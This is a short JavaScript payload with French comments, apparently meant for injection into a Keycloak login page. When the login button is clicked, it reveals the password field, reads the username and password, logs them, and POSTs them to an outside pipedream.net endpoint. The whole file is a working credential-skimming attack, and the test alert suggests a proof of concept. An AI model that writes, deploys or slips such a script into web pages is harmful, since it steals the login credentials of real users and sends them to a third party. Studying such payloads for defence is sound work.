console.log('Payload bouton chargé !');

var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        alert('Test.js');
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
            console.log('Le mot de passe est maintenant visible !');
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        //onclick="this.disabled = 'disabled';submit();"
        console.log(username);
        console.log(password);
        
        fetch('https://eojy4h95a631zv3.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => console.log('Données envoyées avec succès !'))
        .catch(error => console.error('Erreur lors de l\'envoi des données :', error));
    };
} else {
    console.log('Bouton non trouvé');
}
